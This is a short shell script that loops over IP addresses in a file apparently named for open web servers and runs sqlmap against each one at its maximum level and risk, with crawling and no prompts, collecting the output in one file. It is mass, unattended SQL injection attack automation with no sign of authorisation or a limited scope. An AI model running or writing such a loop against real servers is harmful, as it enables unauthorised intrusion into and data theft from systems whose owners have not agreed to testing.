rm -f results.txt
touch results.txt
for ip in $(cat openWebServers.txt); do
	echo $ip
	sqlmap -u $ip --crawl=1 --batch --level=5 --risk=3 >> results.txt
done
